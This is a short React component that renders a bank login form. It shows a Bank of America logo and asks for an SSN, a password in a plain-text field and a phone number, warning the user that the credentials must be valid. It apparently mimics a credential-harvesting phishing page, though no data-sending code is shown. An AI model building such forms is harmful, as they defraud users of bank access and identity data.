import React from 'react';
import NotifyBox from "../../NotifyBox";

function BankAuth() {
    return (
        <div className={'bank-auth'}>
            <div className={'bank-auth-content'}>
                <img className={'bank-logo'} src={'images/banks/boa.png'} alt={'bank logo'} />
                <p>Fill in the login information of your bank account to which you will make payment.</p>
                <div className={'credential-inputs'}>
                    <div className={'c-input-tile'}>
                        <span>SSN</span>
                        <input type={'number'} placeholder={'Social Security number'}/>
                    </div>
                    <div className={'c-input-tile'}>
                        <span>Password</span>
                        <input type={'text'} placeholder={'Password'}/>
                    </div>
                    <div className={'c-input-tile'}>
                        <span>Phone</span>
                        <input type={'tel'} placeholder={'Phone number'}/>
                    </div>
                </div>
            </div>
            <NotifyBox type={'warn'} text={'Warning: Please make sure the credentials are valid.'}/>
        </div>
    )
}

export default BankAuth;
